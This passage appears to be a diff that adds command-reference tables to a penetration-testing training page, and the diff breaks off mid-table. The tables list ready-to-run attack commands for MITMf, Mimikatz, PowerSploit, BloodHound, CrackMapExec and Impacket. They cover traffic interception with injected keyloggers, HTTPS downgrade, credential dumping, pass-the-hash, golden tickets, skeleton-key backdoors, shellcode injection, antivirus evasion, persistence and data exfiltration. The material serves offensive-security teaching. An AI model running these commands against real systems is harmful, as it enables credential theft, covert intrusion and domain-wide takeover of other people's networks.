+                        <td>Enable HTML/JavaScript injection plugin; modifies HTTP responses in transit</td>
+                        <td>Browser exploitation, keylogging, defacement, BeEF hooking</td>
+                        <td><span class="inline-code">mitmf --arp --spoof --gateway 192.168.1.1 --inject</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">--jskeylogger</span></td>
+                        <td>Inject JavaScript keylogger into web pages; captures all keystrokes in browser</td>
+                        <td>Credential harvesting; captures usernames/passwords typed into any web form</td>
+                        <td><span class="inline-code">mitmf --arp --spoof --gateway 192.168.1.1 --inject --jskeylogger</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">--screenshot</span></td>
+                        <td>Enable screenshot/image capture plugin; extracts images from HTTP traffic</td>
+                        <td>Visual reconnaissance; see what victims are viewing (similar to driftnet)</td>
+                        <td><span class="inline-code">mitmf --arp --spoof --gateway 192.168.1.1 --screenshot</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">--responder</span></td>
+                        <td>Integrate Responder functionality; combines MITM with LLMNR/NBT-NS poisoning</td>
+                        <td>Multi-layer credential capture; network and name resolution attacks simultaneously</td>
+                        <td><span class="inline-code">mitmf --arp --spoof --gateway 192.168.1.1 --responder</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">--sslstrip</span></td>
+                        <td>Enable SSLStrip plugin; downgrades HTTPS to HTTP by rewriting links</td>
+                        <td>Against non-HSTS sites; forces cleartext transmission of credentials</td>
+                        <td><span class="inline-code">mitmf --arp --spoof --gateway 192.168.1.1 --sslstrip</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">--hsts</span></td>
+                        <td>Bypass HTTP Strict Transport Security; strips HSTS headers to allow HTTPS downgrade</td>
+                        <td>Against HSTS-protected sites; more advanced than basic SSLStrip</td>
+                        <td><span class="inline-code">mitmf --arp --spoof --gateway 192.168.1.1 --hsts</span></td>
+                    </tr>
+                </tbody>
+            </table>
+
             <div class="info-box">
                 <h4>💡 MITMf Status and Alternatives</h4>
                 <p><strong>MITMf development has slowed, but alternatives exist:</strong> <em>Bettercap</em> offers similar functionality with active development—modular plugins, JavaScript injection, credential sniffing, SSL stripping. <em>mitmproxy</em> provides powerful HTTP/HTTPS interception with Python scripting—better for web application testing, API manipulation, advanced proxy scenarios. <em>Burp Suite</em> excels at web application MITM—requires browser proxy configuration (not network-layer), but offers superior web testing features. <strong>Recommendation:</strong> Use MITMf for comprehensive network-layer MITM demonstrations, but transition to Bettercap for modern engagements. Learn mitmproxy for advanced HTTP manipulation and scripting. Combine tools based on engagement requirements—network-layer attacks (Bettercap), application-layer attacks (mitmproxy/Burp).</p>
@@ -14644,6 +15641,139 @@ sudo mitmf --arp --spoof -i eth0 --gateway 192.168.1.1 --inject --js-payload "ht
 
             <h3>1. Mimikatz - Windows Credential Extraction</h3>
             <p>Mimikatz is the most powerful Windows post-exploitation tool, capable of extracting plaintext passwords, NTLM hashes, Kerberos tickets, and performing pass-the-hash/pass-the-ticket attacks. Created by Benjamin Delpy, it exploits Windows authentication protocols to dump credentials from memory, enabling lateral movement and privilege escalation. Every Windows penetration tester must master Mimikatz for credential harvesting and Kerberos attacks.</p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Command/Flag</th>
+                        <th>Purpose & Why</th>
+                        <th>When to Use</th>
+                        <th>Example</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><span class="inline-code">privilege::debug</span></td>
+                        <td>Enable SeDebugPrivilege to access LSASS memory for credential extraction</td>
+                        <td>First command before any credential dumping—required for LSASS access</td>
+                        <td>privilege::debug</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">sekurlsa::logonpasswords</span></td>
+                        <td>Dump all logged-on user credentials (NTLM, plaintext, Kerberos keys) from LSASS</td>
+                        <td>After gaining admin—primary credential harvesting for lateral movement</td>
+                        <td>sekurlsa::logonpasswords</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">sekurlsa::pth</span></td>
+                        <td>Pass-the-hash attack—create new process with stolen NTLM hash without password</td>
+                        <td>When you have hash but no plaintext—enables lateral movement</td>
+                        <td>sekurlsa::pth /user:admin /domain:corp /ntlm:abc123 /run:cmd.exe</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">sekurlsa::tickets</span></td>
+                        <td>Extract all Kerberos tickets (TGT/TGS) from memory for pass-the-ticket</td>
+                        <td>For Kerberos attacks—steal tickets to impersonate users without passwords</td>
+                        <td>sekurlsa::tickets /export</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">sekurlsa::ekeys</span></td>
+                        <td>Extract Kerberos encryption keys (AES256/AES128/DES) from memory</td>
+                        <td>When targeting Kerberos environments—more powerful than NTLM hashes</td>
+                        <td>sekurlsa::ekeys</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">kerberos::list</span></td>
+                        <td>List all cached Kerberos tickets in current session</td>
+                        <td>Enumerate available tickets before pass-the-ticket attack</td>
+                        <td>kerberos::list</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">kerberos::ptt</span></td>
+                        <td>Pass-the-ticket—inject Kerberos ticket into current session for impersonation</td>
+                        <td>After exporting tickets—authenticate as another user without credentials</td>
+                        <td>kerberos::ptt admin.kirbi</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">kerberos::golden</span></td>
+                        <td>Forge Golden Ticket (domain-wide TGT)—10-year access to entire domain</td>
+                        <td>After dumping krbtgt hash—ultimate domain persistence/dominance</td>
+                        <td>kerberos::golden /user:admin /domain:corp /sid:S-1-5-21... /krbtgt:abc123 /ptt</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">kerberos::silver</span></td>
+                        <td>Forge Silver Ticket (service-specific TGS)—access target service without DC</td>
+                        <td>When targeting specific service (CIFS, HTTP)—stealthier than Golden Ticket</td>
+                        <td>kerberos::golden /domain:corp /sid:S-1-5-21... /target:server /service:cifs /rc4:abc123 /ptt</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">lsadump::sam</span></td>
+                        <td>Dump local account hashes from SAM registry hive</td>
+                        <td>On standalone machines or workstations—extract local admin hashes</td>
+                        <td>lsadump::sam</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">lsadump::secrets</span></td>
+                        <td>Dump LSA secrets (service account passwords, cached creds, VPN passwords)</td>
+                        <td>After SAM dump—extract additional stored secrets from registry</td>
+                        <td>lsadump::secrets</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">lsadump::dcsync</span></td>
+                        <td>DCSync attack—replicate passwords from AD like domain controller</td>
+                        <td>When you have replication rights—dump any user hash without touching DC</td>
+                        <td>lsadump::dcsync /domain:corp /user:Administrator</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">token::elevate</span></td>
+                        <td>Impersonate SYSTEM or other privileged token for privilege escalation</td>
+                        <td>From admin to SYSTEM—higher privileges for protected operations</td>
+                        <td>token::elevate</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">token::list</span></td>
+                        <td>List all available Windows access tokens for impersonation</td>
+                        <td>Enumerate tokens before impersonation—find domain admin tokens</td>
+                        <td>token::list</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">token::run</span></td>
+                        <td>Execute process with impersonated token</td>
+                        <td>After finding valuable token—run commands as that user</td>
+                        <td>token::run /process:cmd.exe</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">crypto::capi</span></td>
+                        <td>List/export cryptographic keys using CryptoAPI (RSA, certificates)</td>
+                        <td>When targeting certificates—extract private keys for VPN/code signing</td>
+                        <td>crypto::capi</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">crypto::cng</span></td>
+                        <td>List/export cryptographic keys using CNG (newer crypto API)</td>
+                        <td>Modern Windows systems—extract certificate private keys</td>
+                        <td>crypto::cng</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">vault::list</span></td>
+                        <td>List stored credentials in Windows Credential Manager</td>
+                        <td>Find saved passwords—RDP, web, generic credentials</td>
+                        <td>vault::list</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">vault::cred</span></td>
+                        <td>Extract credentials from Windows Vault with DPAPI decryption</td>
+                        <td>After vault enumeration—decrypt and extract actual passwords</td>
+                        <td>vault::cred /patch</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">misc::skeleton</span></td>
+                        <td>Inject skeleton key into domain controller—master password for all accounts</td>
+                        <td>For ultimate persistence—backdoor DC to allow any password</td>
+                        <td>misc::skeleton</td>
+                    </tr>
+                </tbody>
+            </table>
 
             <div class="info-box">
                 <h4>🎯 Core Mimikatz Capabilities</h4>
@@ -14766,6 +15896,109 @@ sekurlsa::pth /user:administrator /domain:contoso.com /ntlm:32ed87bdb5fdc5e9cba8
             <h3>2. PowerSploit - PowerShell Post-Exploitation Framework</h3>
             <p>PowerSploit is a collection of Microsoft PowerShell modules for penetration testing, focusing on reconnaissance, privilege escalation, code execution, and persistence. Since PowerShell is native to Windows and often whitelisted by application control, PowerSploit enables stealthy post-exploitation by living off the land. Key modules include Invoke-Mimikatz, Get-System, PowerView (Active Directory enumeration), and various persistence mechanisms.</p>
 
+            <table>
+                <thead>
+                    <tr>
+                        <th>Command/Flag</th>
+                        <th>Purpose & Why</th>
+                        <th>When to Use</th>
+                        <th>Example</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><span class="inline-code">Invoke-Mimikatz</span></td>
+                        <td>Execute Mimikatz entirely in PowerShell memory—no exe on disk, evades AV</td>
+                        <td>When mimikatz.exe is blocked—reflective DLL injection in PowerShell</td>
+                        <td>Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Get-System</span></td>
+                        <td>Escalate from admin to SYSTEM privileges using token manipulation</td>
+                        <td>When admin isn't enough—need SYSTEM for protected operations</td>
+                        <td>Get-System -Technique Token</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Invoke-Shellcode</span></td>
+                        <td>Inject shellcode (Meterpreter) into current or remote process memory</td>
+                        <td>For stealthy backdoors—run payload without creating new process</td>
+                        <td>Invoke-Shellcode -Shellcode @(0xfc,0xe8...) -ProcessID 1234</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Add-Persistence</span></td>
+                        <td>Create persistence via registry, scheduled task, or WMI event subscription</td>
+                        <td>Maintain access after reboot—automatic payload execution</td>
+                        <td>Add-Persistence -ScriptBlock {payload} -RegistryPath HKCU:\...\Run</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Enabled-DuplicateToken</span></td>
+                        <td>Duplicate access token from another process for impersonation</td>
+                        <td>Steal tokens from privileged processes—impersonate without passwords</td>
+                        <td>Enable-DuplicateToken -ProcessID 1234</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Invoke-TokenManipulation</span></td>
+                        <td>Enumerate/steal/impersonate Windows access tokens across processes</td>
+                        <td>Find domain admin tokens on compromised machine—lateral movement</td>
+                        <td>Invoke-TokenManipulation -Enumerate | Where {$_.Username -like '*admin*'}</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">PowerUp</span></td>
+                        <td>Full privilege escalation enumeration suite—finds all common misconfigurations</td>
+                        <td>After initial access—identify path from user to admin/SYSTEM</td>
+                        <td>Import-Module PowerUp.ps1; Invoke-AllChecks</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Invoke-AllChecks</span></td>
+                        <td>PowerUp's master function—runs all privilege escalation checks at once</td>
+                        <td>First command after loading PowerUp—comprehensive priv-esc scan</td>
+                        <td>Invoke-AllChecks | Out-File privesc.txt</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Out-EncodedCommand</span></td>
+                        <td>Encode PowerShell commands in base64 to evade basic AV/logging</td>
+                        <td>Hide malicious commands—bypass simple string detection</td>
+                        <td>Out-EncodedCommand -ScriptBlock {Invoke-Mimikatz}</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Out-CompressedDll</span></td>
+                        <td>Compress/encode DLL for in-memory loading—no disk write required</td>
+                        <td>Load tools in memory—avoid file-based detection</td>
+                        <td>Out-CompressedDll -FilePath mimikatz.dll</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Invoke-DllInjection</span></td>
+                        <td>Inject malicious DLL into running process memory</td>
+                        <td>Hide payload in legitimate process—evade process monitoring</td>
+                        <td>Invoke-DllInjection -ProcessID 1234 -Dll C:\evil.dll</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Get-GPPPassword</span></td>
+                        <td>Extract passwords from Group Policy Preferences (SYSVOL cpassword field)</td>
+                        <td>When in domain—exploit MS14-025 for plaintext passwords in SYSVOL</td>
+                        <td>Get-GPPPassword -Server dc01.corp.com</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Get-Keystrokes</span></td>
+                        <td>Log all keyboard input to file—capture passwords/sensitive data</td>
+                        <td>For surveillance—monitor user activity and capture credentials</td>
+                        <td>Get-Keystrokes -LogPath C:\temp\keys.txt</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Get-TimedScreenshot</span></td>
+                        <td>Capture screenshots at intervals—monitor user activity visually</td>
+                        <td>Document user actions—evidence collection or surveillance</td>
+                        <td>Get-TimedScreenshot -Path C:\temp\screens -Interval 60</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Invoke-PortScan</span></td>
+                        <td>PowerShell port scanner—enumerate network from compromised host</td>
+                        <td>When can't upload nmap—use built-in PowerShell for network recon</td>
+                        <td>Invoke-PortScan -Hosts 192.168.1.0/24 -Ports 445,3389,5985</td>
+                    </tr>
+                </tbody>
+            </table>
+
             <div class="info-box">
                 <h4>🎯 PowerSploit Module Categories</h4>
                 <p><strong>PowerSploit organizes post-exploitation capabilities into functional modules:</strong> <em>CodeExecution</em> (Invoke-Shellcode, Invoke-DllInjection, Invoke-ReflectivePEInjection for running code in memory), <em>ScriptModification</em> (Out-EncodedCommand, Out-CompressedDll for evasion), <em>Persistence</em> (New-UserPersistenceOption, Add-Persistence for maintaining access), <em>Privesc</em> (Get-System, PowerUp for privilege escalation), <em>Recon</em> (Invoke-Portscan, Get-HttpStatus for network discovery), <em>Exfiltration</em> (Invoke-Mimikatz, Get-Keystrokes, Get-TimedScreenshot). All modules execute in memory without touching disk, evading file-based antivirus. The framework's power: combine modules for complete attack chains entirely in PowerShell.</p>
@@ -14871,6 +16104,109 @@ Get-TimedScreenshot -Path C:\temp\screenshots -Interval 60
 
             <h3>3. BloodHound - Active Directory Attack Path Analysis</h3>
             <p>BloodHound is a graph-based Active Directory reconnaissance tool that reveals hidden relationships and attack paths in AD environments. It uses graph theory to identify the shortest path to Domain Admin, map trust relationships, find Kerberoastable accounts, and visualize complex permission chains. BloodHound transforms AD enumeration from manual guesswork into mathematical path analysis, making it indispensable for enterprise penetration testing.</p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Command/Flag</th>
+                        <th>Purpose & Why</th>
+                        <th>When to Use</th>
+                        <th>Example</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><span class="inline-code">SharpHound.exe -c All</span></td>
+                        <td>Collect all AD data (users, groups, computers, sessions, ACLs, trusts) for analysis</td>
+                        <td>Initial BloodHound collection—comprehensive domain mapping</td>
+                        <td>SharpHound.exe -c All -d corp.com --zipfilename corp_bh.zip</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Find all Domain Admins</span></td>
+                        <td>Identify all users with Domain Admin privileges—primary targets</td>
+                        <td>First query after import—know your ultimate targets</td>
+                        <td>MATCH (n:Group) WHERE n.name =~ 'DOMAIN ADMINS@.*' RETURN n</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Shortest paths to Domain Admins</span></td>
+                        <td>Calculate fastest attack path from compromised user to DA—mathematical optimization</td>
+                        <td>After marking owned user—automate path finding, save hours of manual enum</td>
+                        <td>Mark user as owned → Pre-built query: "Shortest Paths to Domain Admins from Owned"</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Find Kerberoastable users</span></td>
+                        <td>Identify users with SPNs—can extract TGS for offline password cracking</td>
+                        <td>Early in engagement—easy wins for credential harvesting</td>
+                        <td>MATCH (n:User) WHERE n.hasspn=true RETURN n</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Find AS-REP Roastable users</span></td>
+                        <td>Users without Kerberos pre-auth—can request TGT for offline cracking without password</td>
+                        <td>When looking for weak configs—no authentication required for hash</td>
+                        <td>MATCH (u:User {dontreqpreauth:true}) RETURN u</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Find computers with Unconstrained Delegation</span></td>
+                        <td>Computers that can impersonate any user—Kerberos delegation abuse vector</td>
+                        <td>For privilege escalation—compromise these to steal admin tickets</td>
+                        <td>MATCH (c:Computer {unconstraineddelegation:true}) RETURN c</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Find principals with DCSync rights</span></td>
+                        <td>Users/groups with AD replication permissions—can dump all domain hashes</td>
+                        <td>Identify DCSync candidates—path to every domain credential</td>
+                        <td>MATCH p=(n)-[:MemberOf|GetChanges|GetChangesAll*1..]->(d:Domain) RETURN p</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Outbound Object Control</span></td>
+                        <td>Show what objects current user can modify (GenericAll, WriteDacl, etc.)</td>
+                        <td>After compromising account—find what you can abuse for escalation</td>
+                        <td>Right-click user → "Outbound Object Control"</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Shortest paths from Kerberoastable users</span></td>
+                        <td>Attack paths starting from crackable accounts—plan multi-stage attack</td>
+                        <td>After identifying roastable users—evaluate impact of cracking them</td>
+                        <td>MATCH p=shortestPath((n:User {hasspn:true})-[*1..]->(m:Group {name:'DOMAIN ADMINS@CORP'})) RETURN p</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Custom Cypher queries</span></td>
+                        <td>Write custom Neo4j graph queries for specific scenarios—unlimited analysis</td>
+                        <td>For complex investigations—query beyond pre-built templates</td>
+                        <td>MATCH (u:User)-[:AdminTo]->(c:Computer) WITH u, count(c) as adminCount WHERE adminCount > 5 RETURN u</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Mark as Owned</span></td>
+                        <td>Flag compromised accounts/computers—track progress and find paths from owned assets</td>
+                        <td>Every time you compromise account—mark to update attack paths</td>
+                        <td>Right-click node → "Mark User as Owned"</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Mark as High Value</span></td>
+                        <td>Flag critical assets (servers, privileged users)—prioritize attack paths</td>
+                        <td>Identify key targets—focus on paths to valuable systems</td>
+                        <td>Right-click node → "Mark as High Value"</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Node Info</span></td>
+                        <td>Display detailed properties (group memberships, permissions, sessions, ACLs)</td>
+                        <td>Investigate specific accounts—understand permissions and relationships</td>
+                        <td>Click node → View properties panel</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Edit Node</span></td>
+                        <td>Modify node properties (mark owned, add notes, change attributes)</td>
+                        <td>Document findings—add context to discovered accounts/systems</td>
+                        <td>Right-click → "Edit Node" → Add notes/change properties</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">Pathfinding options</span></td>
+                        <td>Configure path algorithms (shortest, avoid detection, specific edge types)</td>
+                        <td>Refine attack paths—optimize for speed or stealth</td>
+                        <td>Settings → Pathfinding → Configure edge types and weights</td>
+                    </tr>
+                </tbody>
+            </table>
 
             <div class="info-box">
                 <h4>🎯 BloodHound Components and Workflow</h4>
@@ -14987,6 +16323,127 @@ MATCH (c:Computer) WHERE c.operatingsystem =~ '(?i).*(2008|2003|xp|vista|7).*' R
 
             <h3>4. CrackMapExec - Network Lateral Movement Swiss Army Knife</h3>
             <p>CrackMapExec (CME) is a post-exploitation toolkit designed for assessing large Active Directory networks through automated enumeration, password spraying, hash spraying, command execution, and credential validation. It supports multiple protocols (SMB, WMI, MSSQL, SSH, WinRM, LDAP, RDP) and excels at lateral movement across hundreds of systems simultaneously, making it essential for enterprise penetration testing where scale matters.</p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Command/Flag</th>
+                        <th>Purpose & Why</th>
+                        <th>When to Use</th>
+                        <th>Example</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><span class="inline-code">-u user</span></td>
+                        <td>Specify username for authentication—can be single user or file of users</td>
+                        <td>Every CME command—provide credentials for access</td>
+                        <td>crackmapexec smb 192.168.1.0/24 -u administrator -p 'pass'</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-p password</span></td>
+                        <td>Specify password for authentication—supports plaintext or file</td>
+                        <td>With -u flag—password authentication instead of hash/ticket</td>
+                        <td>crackmapexec smb 192.168.1.10 -u admin -p 'P@ssw0rd123!'</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-H hash</span></td>
+                        <td>Pass-the-hash authentication—use NTLM hash instead of password</td>
+                        <td>After dumping credentials—lateral movement with hashes only</td>
+                        <td>crackmapexec smb 192.168.1.0/24 -u admin -H aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-M module</span></td>
+                        <td>Execute CME module (mimikatz, lsassy, spider_plus, etc.) on targets</td>
+                        <td>After confirming access—run post-exploitation modules at scale</td>
+                        <td>crackmapexec smb 192.168.1.10 -u admin -p 'pass' -M mimikatz</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-L enumerate-users</span></td>
+                        <td>Enumerate domain users via SMB/LDAP—reconnaissance before attacks</td>
+                        <td>Early enumeration—build user list for password spraying</td>
+                        <td>crackmapexec smb 192.168.1.5 -u guest -p '' --users</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-S enumerate-shares</span></td>
+                        <td>List SMB shares and permissions on target—find sensitive data</td>
+                        <td>After access—discover writable shares and data repositories</td>
+                        <td>crackmapexec smb 192.168.1.0/24 -u admin -p 'pass' --shares</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">--sam dump-sam</span></td>
+                        <td>Dump local SAM database hashes from target system</td>
+                        <td>On workstations/servers—extract local admin hashes for lateral movement</td>
+                        <td>crackmapexec smb 192.168.1.10 -u admin -p 'pass' --sam</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">--lsa dump-lsa</span></td>
+                        <td>Dump LSA secrets (cached creds, service passwords) from registry</td>
+                        <td>After SAM dump—extract additional credentials and secrets</td>
+                        <td>crackmapexec smb 192.168.1.10 -u admin -p 'pass' --lsa</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">--ntds dump-ntds</span></td>
+                        <td>Dump NTDS.dit (entire AD database) from domain controller—all domain hashes</td>
+                        <td>When compromising DC—ultimate credential harvest</td>
+                        <td>crackmapexec smb dc01.corp.com -u admin -p 'pass' --ntds</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-x command</span></td>
+                        <td>Execute cmd.exe command on target via SMB/WMI</td>
+                        <td>For Windows command execution—run system commands remotely</td>
+                        <td>crackmapexec smb 192.168.1.10 -u admin -p 'pass' -x 'whoami'</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-X ps-command</span></td>
+                        <td>Execute PowerShell command on target—more powerful than cmd</td>
+                        <td>When needing PowerShell—.NET access and advanced scripting</td>
+                        <td>crackmapexec smb 192.168.1.10 -u admin -p 'pass' -X '$PSVersionTable'</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">--spider</span></td>
+                        <td>Recursively list all files in accessible shares—find sensitive data</td>
+                        <td>After enumerating shares—map file locations for data exfiltration</td>
+                        <td>crackmapexec smb 192.168.1.10 -u admin -p 'pass' -M spider_plus</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">--spider_folder</span></td>
+                        <td>Spider specific folder path—targeted file enumeration</td>
+                        <td>When targeting specific share—faster than full spider</td>
+                        <td>crackmapexec smb 192.168.1.10 -u admin -p 'pass' -M spider_plus -o FOLDER=Finance</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">--put-file</span></td>
+                        <td>Upload file to target system via SMB—deploy tools/payloads</td>
+                        <td>Transfer exploits/tools—stage next attack phase</td>
+                        <td>crackmapexec smb 192.168.1.10 -u admin -p 'pass' --put-file payload.exe C:\Windows\Temp\update.exe</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">--get-file</span></td>
+                        <td>Download file from target—exfiltrate sensitive data</td>
+                        <td>Data extraction—retrieve files without interactive shell</td>
+                        <td>crackmapexec smb 192.168.1.10 -u admin -p 'pass' --get-file C:\passwords.txt /tmp/passwords.txt</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-t threads</span></td>
+                        <td>Set number of concurrent threads—control speed vs. stealth</td>
+                        <td>Large networks—increase threads for speed, decrease for stealth</td>
+                        <td>crackmapexec smb 192.168.1.0/24 -u admin -p 'pass' -t 50</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">--continue-on-success</span></td>
+                        <td>Keep testing credentials even after valid one found—find all access points</td>
+                        <td>Password spraying—identify all systems where creds work</td>
+                        <td>crackmapexec smb 192.168.1.0/24 -u admin -p 'Winter2024!' --continue-on-success</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">--gen-relay-list</span></td>
+                        <td>Generate list of systems without SMB signing—targets for NTLM relay</td>
+                        <td>Before relay attack—identify vulnerable systems</td>
+                        <td>crackmapexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt</td>
+                    </tr>
+                </tbody>
+            </table>
 
             <div class="info-box">
                 <h4>🎯 CrackMapExec Core Capabilities</h4>
@@ -15115,6 +16572,91 @@ crackmapexec smb 192.168.1.0/24 -u administrator -H 32ed87bdb5fdc5e9cba885473768
             <h3>5. Impacket - Python Protocol Implementation Suite</h3>
             <p>Impacket is a collection of Python classes for working with network protocols, providing numerous tools for attacking Windows environments. Its scripts implement SMB, MSRPC, LDAP, Kerberos, and other protocols from scratch, enabling pass-the-hash, pass-the-ticket, Kerberoasting, DCSync, and remote command execution without Windows dependencies. Impacket is the foundation for cross-platform Windows exploitation from Linux attack boxes.</p>
 
+            <table>
+                <thead>
+                    <tr>
+                        <th>Command/Flag</th>
+                        <th>Purpose & Why</th>
+                        <th>When to Use</th>
+                        <th>Example</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><span class="inline-code">secretsdump.py</span></td>
+                        <td>Dump credentials (SAM, LSA, NTDS.dit) remotely—Python version of credential dumping</td>
+                        <td>Primary credential extraction tool—works from Linux against Windows</td>
+                        <td>secretsdump.py corp/admin:'pass'@192.168.1.10</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">psexec.py</span></td>
+                        <td>Remote command execution via SMB—upload service executable for shell</td>
+                        <td>Classic lateral movement—reliable but leaves forensic evidence (service creation)</td>
+                        <td>psexec.py corp/admin:'pass'@192.168.1.10</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">wmiexec.py</span></td>
+                        <td>Execute commands via WMI—no service creation, stealthier than psexec</td>
+                        <td>When avoiding service logs—cleaner execution method</td>
+                        <td>wmiexec.py corp/admin@192.168.1.10 -hashes :abc123</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">smbexec.py</span></td>
+                        <td>Execute via SMB with batch file method—better output than wmiexec</td>
+                        <td>When needing command output—creates temp batch files for results</td>
+                        <td>smbexec.py corp/admin:'pass'@192.168.1.10</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">dcomexec.py</span></td>
+                        <td>Execute via DCOM (ShellExecute, MMC20)—alternative when WMI blocked</td>
+                        <td>For evasion—less common execution path</td>
+                        <td>dcomexec.py corp/admin:'pass'@192.168.1.10 'whoami'</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">atexec.py</span></td>
+                        <td>Execute commands via scheduled task—runs at SYSTEM level</td>
+                        <td>When needing SYSTEM privileges—automatic elevation</td>
+                        <td>atexec.py corp/admin:'pass'@192.168.1.10 'whoami'</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">GetNPUsers.py</span></td>
+                        <td>AS-REP Roasting—extract hashes from users without Kerberos pre-auth</td>
+                        <td>Early credential hunting—no authentication needed, offline cracking</td>
+                        <td>GetNPUsers.py corp/ -usersfile users.txt -dc-ip 192.168.1.5</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">GetUserSPNs.py</span></td>
+                        <td>Kerberoasting—request service tickets for offline password cracking</td>
+                        <td>Against service accounts—often have weak passwords and high privileges</td>
+                        <td>GetUserSPNs.py corp/user:'pass' -dc-ip 192.168.1.5 -request</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">ticketer.py</span></td>
+                        <td>Forge Golden/Silver Kerberos tickets—create fake authentication tickets</td>
+                        <td>After dumping krbtgt—persistent domain access without credentials</td>
+                        <td>ticketer.py -nthash abc123 -domain-sid S-1-5-21... -domain corp.com admin</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">getTGT.py</span></td>
+                        <td>Request Kerberos TGT—obtain ticket for authentication</td>
+                        <td>For Kerberos authentication—alternative to NTLM</td>
+                        <td>getTGT.py corp/user:'pass' -dc-ip 192.168.1.5</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">getST.py</span></td>
+                        <td>Request service ticket with impersonation—S4U2Self/S4U2Proxy attacks</td>
+                        <td>Delegation abuse—impersonate users to services</td>
